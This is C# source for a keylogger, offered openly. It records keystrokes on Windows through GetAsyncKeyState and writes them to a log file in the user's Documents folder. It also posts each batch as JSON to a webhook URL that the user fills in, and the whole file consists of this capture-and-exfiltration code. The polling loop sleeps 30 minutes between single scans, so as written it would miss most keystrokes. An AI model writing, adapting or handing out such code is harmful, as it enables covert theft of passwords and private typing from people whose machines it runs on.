using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            string webhookUrl = "YOUR-WEBHOOK-URL-HERE";
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt"; //You can rename log.txt to whatever you want it to be :)
            if (!File.Exists(filePath))
            {
                File.Create(filePath).Dispose();
            }

            while (true)
            {
                StringBuilder sb = new StringBuilder();

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        sb.Append((Keys)i + ", ");
                    }
                }

                if (sb.Length > 0)
                {
                    string data = sb.ToString();
                    data = data.Substring(0, data.Length - 2);

                    using (StreamWriter sw = File.AppendText(filePath))
                    {
                        sw.Write(data);
                    }

                    byte[] bytes = Encoding.UTF8.GetBytes("{\"content\": \"" + data + "\"}");
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(webhookUrl);
                    request.Method = "POST";
                    request.ContentType = "application/json";
                    request.ContentLength = bytes.Length;
                    using (Stream stream = request.GetRequestStream())
                    {
                        stream.Write(bytes, 0, bytes.Length);
                    }

                    using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                    {
                        // Do nothing
                    }
                }

                Thread.Sleep(1800000); //Sleep for 30 minutes
            }
        }
    }
}
